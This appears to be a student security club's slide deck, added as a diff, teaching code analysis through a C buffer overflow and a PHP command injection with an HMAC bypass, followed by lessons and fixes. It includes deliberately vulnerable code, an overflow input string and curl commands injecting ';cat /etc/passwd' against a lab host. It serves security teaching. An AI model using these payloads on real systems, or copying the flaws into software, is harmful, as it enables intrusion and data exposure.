@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>LUCDC: Code Analysis</title>
+<meta name="author" content="(Andrew Rioux)"/>
+<style type="text/css">
+.underline { text-decoration: underline; }
+</style>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/moon.css" id="theme"/>
+
+<link rel="stylesheet" href="../common/theme.css"/>
+
+<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+<script>
+    if( window.location.search.match( /print-pdf/gi ) ) {
+        var link = document.createElement( 'link' );
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = 'https://cdn.jsdelivr.net/npm/reveal.js/css/print/pdf.css';
+        document.getElementsByTagName( 'head' )[0].appendChild( link );
+    }
+</script>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="sec-title-slide" data-background="../common/background.png"><h1>LUCDC: Code Analysis</h1>
+Andrew Rioux (<a href="mailto:arioux@liberty.edu">arioux@liberty.edu</a>)
+</section>
+
+<section>
+<section id="slide-org452bd51" data-background="../common/background.png">
+<h2 id="org452bd51"><span class="section-number-2">1.</span> About me</h2>
+<ul>
+<li class="fragment appear">Andrew Rioux</li>
+<li class="fragment appear">CS: Software Engineering (Sophomore)</li>
+<li class="fragment appear">Software Engineer for US Navy</li>
+<li class="fragment appear">LU CDC Vice President</li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-org017ba17" data-background="../common/background.png">
+<h2 id="org017ba17"><span class="section-number-2">2.</span> Presentation information</h2>
+<div class="outline-text-2" id="text-2">
+</div>
+</section>
+<section id="slide-org05d85e3" data-background="../common/background.png">
+<h3 id="org05d85e3"><span class="section-number-3">2.1.</span> Located at the following git repository</h3>
+<p>
+<a href="https://github.com/r-a303931/lucdc-presentations">https://github.com/r-a303931/lucdc-presentations</a>
+</p>
+
+</section>
+<section id="slide-orgd866187" data-background="../common/background.png">
+<h3 id="orgd866187"><span class="section-number-3">2.2.</span> Example 1</h3>
+<ul>
+<li>Build: <code>docker-compose run example1_build</code> (or <code>make</code> in <a href="./example1">./example1</a>)</li>
+<li>Run: <code>docker-compose run example1</code></li>
+
+</ul>
+
+</section>
+<section id="slide-org255aa3a" data-background="../common/background.png">
+<h3 id="org255aa3a"><span class="section-number-3">2.3.</span> Example 2</h3>
+<ul>
+<li>Start web server: <code>docker-compose up example2</code></li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-orgbb2f005" data-background="../common/background.png">
+<h2 id="orgbb2f005"><span class="section-number-2">3.</span> Life Goals</h2>
+<p>
+What do you plan to do after graduation?
+</p>
+<ul class="fragment appear">
+<li>Penetration testing?</li>
+<li>Security engineer?</li>
+<li>Software Engineer / Programmer?</li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-orgc74af57" data-background="../common/background.png">
+<h2 id="orgc74af57"><span class="section-number-2">4.</span> What are you going to deal with in your day to day job?</h2>
+<p class="fragment appear">
+Code!
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org835cd7f" data-background="../common/background.png">
+<h2 id="org835cd7f"><span class="section-number-2">5.</span> What we will be going over here</h2>
+<ul>
+<li class="fragment appear">Example 1: Too simple with no safety (C)</li>
+<li class="fragment appear">Example 2: Too complex with fake safety (PHP)</li>
+<li class="fragment appear">What can we learn?</li>
+<li class="fragment appear">Club exercise (JS)!</li>
+
+</ul>
+
+</section>
+</section>
+<section>
+<section id="slide-org08aff30" data-background="../common/background.png">
+<h2 id="org08aff30"><span class="section-number-2">6.</span> Example 1: Too simple with no safety</h2>
+<div class="outline-text-2" id="text-6">
+</div>
+</section>
+<section id="slide-org9a203ea" data-background="../common/background.png">
+<h3 id="org9a203ea"><span class="section-number-3">6.1.</span> Source code:</h3>
+<div class="org-src-container">
+
+<pre  class="src src-c"   ><code trim><span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #51afef;">&lt;</span><span style="color: #98be65;">stdio.h</span><span style="color: #51afef;">&gt;</span>
+<span style="color: #5B6268;">// </span><span style="color: #5B6268;">It's a surprise tool that will help us later...</span>
+<span style="color: #ECBE7B;">void</span> <span style="color: #c678dd;">shell</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
+    printf<span style="color: #c678dd;">(</span><span style="color: #98be65;">"Suspicious function here...\n"</span><span style="color: #c678dd;">)</span>;
+<span style="color: #51afef;">}</span>
+<span style="color: #ECBE7B;">void</span> <span style="color: #c678dd;">get_name</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
+    printf<span style="color: #c678dd;">(</span><span style="color: #98be65;">"What is your name?\n"</span><span style="color: #c678dd;">)</span>;
+    <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">buffer</span><span style="color: #c678dd;">[</span><span style="color: #da8548; font-weight: bold;">20</span><span style="color: #c678dd;">]</span>;
+    scanf<span style="color: #c678dd;">(</span><span style="color: #98be65;">"%s"</span>, buffer<span style="color: #c678dd;">)</span>;
+    printf<span style="color: #c678dd;">(</span><span style="color: #98be65;">"Hello, %s!\n"</span>, buffer<span style="color: #c678dd;">)</span>;
+<span style="color: #51afef;">}</span>
+<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
+    get_name<span style="color: #c678dd;">()</span>;
+<span style="color: #51afef;">}</span>
+</code></pre>
+</div>
+
+</section>
+<section id="slide-orgb4aafc2" data-background="../common/background.png">
+<h3 id="orgb4aafc2"><span class="section-number-3">6.2.</span> How is this compiled?</h3>
+<div class="org-src-container">
+
+<pre  class="src src-makefile"   ><code trim><span style="color: #51afef;">example1</span>: example1.c
+    gcc -no-pie --no-stack-protector -o example1 example1.c
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org630369a" data-background="../common/background.png">
+<h3 id="org630369a"><span class="section-number-3">6.3.</span> Options of interest</h3>
+<ul class="fragment appear">
+<li><code>-no-pie</code></li>
+
+</ul>
+<ul class="fragment appear">
+<li><code>--no-stack-protector</code></li>
+
+</ul>
+
+</section>
+<section id="slide-orgcf0c030" data-background="../common/background.png">
+<h3 id="orgcf0c030"><span class="section-number-3">6.4.</span> We know <code>shell</code> is bad</h3>
+<p>
+But it&rsquo;s benign&#x2026;.
+</p>
+<p class="fragment appear">
+right?
+</p>
+
+</section>
+<section id="slide-org1ae93e3" data-background="../common/background.png">
+<h3 id="org1ae93e3"><span class="section-number-3">6.5.</span> Nope!</h3>
+<p>
+What if your name is <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x46\x11\x40\x0\x0\x0\x0\x0</code>?
+</p>
+
+</section>
+<section id="slide-org805f477" data-background="../common/background.png">
+<h3 id="org805f477"><span class="section-number-3">6.6.</span> What happened?</h3>
+<p class="fragment appear">
+Buffer overflow exploit!
+</p>
+
+</section>
+<section id="slide-orgcfba42b" data-background="../common/background.png">
+<h3 id="orgcfba42b"><span class="section-number-3">6.7.</span> What could happen?</h3>
+</section>
+</section>
+<section>
+<section id="slide-org2bb715c" data-background="../common/background.png">
+<h2 id="org2bb715c"><span class="section-number-2">7.</span> Example 2: Too complex with fake safety</h2>
+<p>
+PHP has some magic variable management
+</p>
+<p class="fragment appear">
+&#x2026;can this be taken advantage of?
+</p>
+
+</section>
+<section id="slide-orge8615e6" data-background="../common/background.png">
+<h3 id="orge8615e6"><span class="section-number-3">7.1.</span> Aside: How HTTP works</h3>
+<p class="fragment appear">
+You make a request, and get a response
+</p>
+
+</section>
+<section id="slide-orge4ec7e4" data-background="../common/background.png">
+<h4 id="orge4ec7e4"><span class="section-number-4">7.1.1.</span> Get me a file, please!</h4>
+</section>
+<section id="slide-org6348a69" data-background="../common/background.png">
+<h4 id="org6348a69"><span class="section-number-4">7.1.2.</span> Post to this location and do a thing!</h4>
+</section>
+<section id="slide-orgb0f6ab2" data-background="../common/background.png">
+<h4 id="orgb0f6ab2"><span class="section-number-4">7.1.3.</span> How do we handle that in PHP?</h4>
+<ul>
+<li class="fragment appear"><code>$_GET</code></li>
+<li class="fragment appear"><code>$_POST</code></li>
+
+</ul>
+</section>
+<section id="slide-orgcb483d2" data-background="../common/background.png">
+<h3 id="orgcb483d2"><span class="section-number-3">7.2.</span> Aside: PHP in 5 seconds for C++ programmers</h3>
+<p class="fragment appear">
+Every variable begins with <code>$</code>
+</p>
+
+<p class="fragment appear">
+Every PHP file begins with <code>&lt;?php</code>
+</p>
+
+<p class="fragment appear">
+No main function, everything just happens in the order it&rsquo;s displayed
+</p>
+
+<p class="fragment appear">
+Other than that, basically C++!
+</p>
+</section>
+<section id="slide-org4249bbf" data-background="../common/background.png">
+<h3 id="org4249bbf"><span class="section-number-3">7.3.</span> Source code: Input check</h3>
+<div class="org-src-container">
+
+<pre  class="src src-php"   ><code trim><span style="color: #51afef; font-weight: bold;">&lt;?php</span>
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">empty</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span> || <span style="color: #51afef;">empty</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'host'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
+        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 400 Bad Request'</span><span style="color: #c678dd;">)</span>;
+        <span style="color: #51afef;">exit</span>;
+    <span style="color: #51afef;">}</span>
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org261ca23" data-background="../common/background.png">
+<h3 id="org261ca23"><span class="section-number-3">7.4.</span> Source code: Authentication and execution</h3>
+<div class="org-src-container">
+
+<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #98be65;">"SECRET"</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
+        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;
+
+    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
+        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
+        <span style="color: #51afef;">exit</span>;
+    <span style="color: #51afef;">}</span>
+
+    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #98be65;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org0050bcd" data-background="../common/background.png">
+<h3 id="org0050bcd"><span class="section-number-3">7.5.</span> Step 0: Identify host</h3>
+<p class="fragment appear">
+10.104.58.39
+</p>
+
+<p class="fragment appear">
+Join in! <a href="http://10.104.58.39/ui.php" class="fragment appear">http://10.104.58.39/ui.php</a>
+</p>
+
+</section>
+<section id="slide-org64afbef" data-background="../common/background.png">
+<h3 id="org64afbef"><span class="section-number-3">7.6.</span> Step 1: Normal Usage</h3>
+<p class="fragment fade-in-and-out">
+What&rsquo;s &ldquo;normal&rdquo;?
+</p>
+
+</section>
+<section id="slide-orga5b71b3" data-background="../common/background.png">
+<h4 id="orga5b71b3"><span class="section-number-4">7.6.1.</span> Usage 1:</h4>
+<ul>
+<li>host: <code>google.com</code></li>
+<li>hmac: <code>ad1663b82d5bdb2e1938...</code></li>
+
+</ul>
+
+</section>
+<section id="slide-orge873c9f" data-background="../common/background.png">
+<h4 id="orge873c9f"><span class="section-number-4">7.6.2.</span> Usage 2:</h4>
+<ul>
+<li>host: <code>google.com</code></li>
+<li>nonce: <code>STUPID_NONCE</code></li>
+<li>hmac: <code>b3700dedb181ee312930...</code></li>
+
+</ul>
+
+</section>
+<section id="slide-orgd51b604" data-background="../common/background.png">
+<h4 id="orgd51b604"><span class="section-number-4">7.6.3.</span> Command</h4>
+<aside class="notes">
+<p>
+Execute command below:
+</p>
+
+<p>
+<a href="curl --data "host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 127.0.0.1">curl --data "host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 127.0.0.1</a>
+</p>
+
+</aside>
+
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #98be65;">"host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64"</span> 10.104.58.39
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org6b01663" data-background="../common/background.png">
+<h3 id="org6b01663"><span class="section-number-3">7.7.</span> What functions are being called and variables used?</h3>
+<div class="org-src-container">
+
+<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #98be65;">"SECRET"</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
+        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;
+
+    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
+        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
+        <span style="color: #51afef;">exit</span>;
+    <span style="color: #51afef;">}</span>
+
+    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #98be65;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+<ul>
+<li class="fragment appear"><a href="https://www.php.net/manual/en/function.getenv.php"><code>getenv</code></a></li>
+<li class="fragment appear"><a href="https://www.php.net/manual/en/function.isset.php"><code>isset</code></a></li>
+<li class="fragment appear"><a href="https://www.php.net/manual/en/reserved.variables.post.php"><code>$_POST</code></a></li>
+<li class="fragment appear"><a href="https://www.php.net/manual/en/function.hash-hmac.php"><code>hash_hmac</code></a></li>
+<li class="fragment appear"><a href="https://www.php.net/manual/en/function.header.php"><code>header</code></a></li>
+<li class="fragment appear"><a href="https://www.php.net/manual/en/function.passthru.php"><code>passthru</code></a></li>
+
+</ul>
+
+</section>
+<section id="slide-org114a364" data-background="../common/background.png">
+<h3 id="org114a364"><span class="section-number-3">7.8.</span> Step 2: Bash Injection</h3>
+<p>
+Is <code>passthru</code> vulnerable to shell injections?
+</p>
+<p class="fragment appear">
+Yes!
+</p>
+
+</section>
+<section id="slide-orgf50e0cb" data-background="../common/background.png">
+<h4 id="orgf50e0cb"><span class="section-number-4">7.8.1.</span> Example usage:</h4>
+<ul>
+<li>host: <code>google.com;cat /etc/passwd</code></li>
+<li>hmac: <code>84e26d8e32086e127a60...</code></li>
+
+</ul>
+
+</section>
+<section id="slide-orga6b5e29" data-background="../common/background.png">
+<h4 id="orga6b5e29"><span class="section-number-4">7.8.2.</span> Command</h4>
+<aside class="notes">
+<p>
+Execute command below:
+</p>
+
+<p>
+<a href="curl --data "host=google.com;cat /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 127.0.0.1">curl --data "host=google.com;cat /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 127.0.0.1</a>
+</p>
+
+</aside>
+
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #98be65;">"host=google.com;</span><span style="color: #98be65;">cat</span><span style="color: #98be65;"> /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417"</span> 10.104.58.39
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org9ade53f" data-background="../common/background.png">
+<h3 id="org9ade53f"><span class="section-number-3">7.9.</span> Step 3: HMAC Circumvention</h3>
+<p>
+What else is vulnerable in the code above?
+</p>
+<p class="fragment appear">
+Is there anything magic that happens, a &ldquo;feature&rdquo;?
+</p>
+
+</section>
+<section id="slide-org2d2f04a" data-background="../common/background.png">
+<h4 id="org2d2f04a"><span class="section-number-4">7.9.1.</span> Did you catch it?</h4>
+<p class="fragment appear">
+&ldquo;One feature of PHP&rsquo;s processing of POST and GET variables is that it automatically decodes indexed form variable names.&rdquo;
+</p>
+
+<p class="fragment appear">
+What does this do to the types of variables used?
+</p>
+
+</section>
+<section id="slide-org29c53a1" data-background="../common/background.png">
+<h4 id="org29c53a1"><span class="section-number-4">7.9.2.</span> Some PHP analysis</h4>
+<ul class="fragment appear">
+<li><code>element[]</code>: 1</li>
+<li><code>element[]</code>: 2</li>
+
+</ul>
+
+<div class="org-src-container">
+
+<pre  class="fragment appear"   ><code trim><span style="color: #51afef; font-weight: bold;">&lt;?php</span>
+    var_dump<span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">array(1) {</span>
+    <span style="color: #5B6268;">//     </span><span style="color: #5B6268;">["element"] =&gt; array(2) {</span>
+    <span style="color: #5B6268;">//         </span><span style="color: #5B6268;">[0] =&gt; string(1) "1"</span>
+    <span style="color: #5B6268;">//         </span><span style="color: #5B6268;">[1] =&gt; string(2) "2"</span>
+    <span style="color: #5B6268;">//     </span><span style="color: #5B6268;">}</span>
+    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">}</span>
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org70018f4" data-background="../common/background.png">
+<h4 id="org70018f4"><span class="section-number-4">7.9.3.</span> What are the arguments this bit of code expects?</h4>
+<div class="org-src-container">
+
+<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #98be65;">"SECRET"</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
+        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;
+
+    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
+        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
+        <span style="color: #51afef;">exit</span>;
+    <span style="color: #51afef;">}</span>
+
+    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #98be65;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+<p class="fragment appear">
+What can we change?
+</p>
+
+<ul>
+<li class="fragment appear"><code>hmac</code></li>
+<li class="fragment appear"><code>host</code></li>
+<li class="fragment appear"><code>nonce</code></li>
+
+</ul>
+
+</section>
+<section id="slide-orgcdb9534" data-background="../common/background.png">
+<h4 id="orgcdb9534"><span class="section-number-4">7.9.4.</span> What happens to <code>hash_hmac</code> when we change <code>$_POST['nonce']</code> to an array?</h4>
+<p class="fragment appear">
+Let&rsquo;s see!
+</p>
+
+</section>
+<section id="slide-orgbf76778" data-background="../common/background.png">
+<h4 id="orgbf76778"><span class="section-number-4">7.9.5.</span> Commands</h4>
+<aside class="notes">
+<p>
+<a href="docker run -it php:7.4-apache-buster php -a">docker run -it php:7.4-apache-buster php -a</a>
+</p>
+
+</aside>
+
+<div class="org-src-container">
+
+<pre  class="src src-php"   ><code trim>$<span style="color: #dcaeea;">test_value</span> = <span style="color: #51afef;">[</span><span style="color: #98be65;">'1'</span>,<span style="color: #98be65;">'2'</span><span style="color: #51afef;">]</span>;
+var_dump<span style="color: #51afef;">(</span>hash_hmac<span style="color: #c678dd;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">test_value</span>, <span style="color: #98be65;">'dummy'</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="fragment appear"   ><code trim>var_dump<span style="color: #51afef;">(</span>hash_hmac<span style="color: #c678dd;">(</span><span style="color: #98be65;">'sha256'</span>, <span style="color: #98be65;">'a string'</span>, <span style="color: #a9a1e1;">NULL</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org20fabdd" data-background="../common/background.png">
+<h4 id="org20fabdd"><span class="section-number-4">7.9.6.</span> It works!</h4>
+<p class="fragment appear">
+Now what?
+</p>
+
+</section>
+<section id="slide-org443decb" data-background="../common/background.png">
+<h4 id="org443decb"><span class="section-number-4">7.9.7.</span> Look at the source code again&#x2026;</h4>
+<div class="org-src-container">
+
+<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #98be65;">"SECRET"</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
+        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;
+
+    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;
+
+    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
+        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
+        <span style="color: #51afef;">exit</span>;
+    <span style="color: #51afef;">}</span>
+
+    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #98be65;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+</section>
+<section id="slide-orgd502f83" data-background="../common/background.png">
+<h4 id="orgd502f83"><span class="section-number-4">7.9.8.</span> Resulting query</h4>
+<ul>
+<li class="fragment appear">host: <code>google.com;cat /etc/passwd</code></li>
+<li class="fragment appear">hmac: <code>bbf36c444a323aca2808...</code></li>
+<li class="fragment appear">nonce[]: 1</li>
+<li class="fragment appear">nonce[]: 2</li>
+
+</ul>
+
+</section>
+<section id="slide-org9490bb9" data-background="../common/background.png">
+<h4 id="org9490bb9"><span class="section-number-4">7.9.9.</span> Command</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #98be65;">"nonce[]=1&amp;nonce[]=2&amp;host=google.com;</span><span style="color: #98be65;">cat</span><span style="color: #98be65;"> /etc/passwd&amp;hmac=bbf36c444a323aca2808e486ea2165ff76d6f671e5dee9987007dba448230a53"</span> 10.104.58.39
+</code></pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgbd48d20" data-background="../common/background.png">
+<h2 id="orgbd48d20"><span class="section-number-2">8.</span> What can we learn from both examples?</h2>
+<div class="outline-text-2" id="text-8">
+</div>
+</section>
+<section id="slide-org0956ec0" data-background="../common/background.png">
+<h3 id="org0956ec0"><span class="section-number-3">8.1.</span> Assume there is a problem</h3>
+<p class="fragment appear">
+It makes it easier to recover when there is one
+</p>
+
+</section>
+<section id="slide-orge3df894" data-background="../common/background.png">
+<h3 id="orge3df894"><span class="section-number-3">8.2.</span> Do not trust users!</h3>
+<p class="fragment appear">
+Limit user input and verify it is the right format and type
+</p>
+
+</section>
+<section id="slide-orgec2a0fe" data-background="../common/background.png">
+<h3 id="orgec2a0fe"><span class="section-number-3">8.3.</span> Do not trust your programming language!</h3>
+<p class="fragment appear">
+Learn the ins and outs of whatever language you are using
+</p>
+
+<p class="fragment appear">
+Find a place to listen to news about your language of choice
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-orgc6f1ded" data-background="../common/background.png">
+<h2 id="orgc6f1ded"><span class="section-number-2">9.</span> How can we secure Example 1?</h2>
+<div class="outline-text-2" id="text-9">
+</div>
+</section>
+<section id="slide-org4bbaa17" data-background="../common/background.png">
+<h3 id="org4bbaa17"><span class="section-number-3">9.1.</span> Don&rsquo;t provide the option to overflow the buffer: fgets(3)</h3>
+</section>
+<section id="slide-org52db7b3" data-background="../common/background.png">
+<h3 id="org52db7b3"><span class="section-number-3">9.2.</span> Compare the following</h3>
+<div class="org-src-container">
+
+<pre  class="fragment appear"   ><code trim><span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">scanf</span><span style="color: #51afef;">(</span><span style="color: #51afef;">const</span> <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">format</span>, ...<span style="color: #51afef;">)</span>;
